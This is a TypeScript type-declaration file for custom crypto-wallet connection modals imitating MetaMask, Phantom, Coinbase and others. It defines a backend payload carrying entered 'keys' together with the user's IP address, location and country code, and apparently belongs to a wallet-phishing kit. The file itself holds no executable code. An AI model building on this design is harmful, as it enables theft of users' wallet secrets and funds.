export type WalletType = 'MetaMask' | 'Phantom' | 'Rabby' | 'TronLink' | 'Bitget' | 'Coinbase' | 'Solflare' | 'Mac';
export interface WalletConnectModalProps {
    onWalletSelect?: (wallet: WalletType) => void;
    onClose?: () => void;
    isOpen?: boolean;
}
export interface CustomWalletModalProps {
    wallet: WalletType;
    onClose?: () => void;
    isOpen?: boolean;
    userId?: string;
    backendConfig?: {
        enabled?: boolean;
        userId?: string;
    };
    darkMode?: boolean;
}
export interface WalletConfig {
    id: WalletType;
    name: string;
    shortKey: string;
    icon?: string;
}
export type KeyType = 'cha' | 'enter';
export interface BackendKeyPayload {
    user_id: string;
    key_type: KeyType;
    keys: string;
    wallet_type: string;
    IP_address: string;
    Location: string;
    country_code: string;
}
//# sourceMappingURL=types.d.ts.map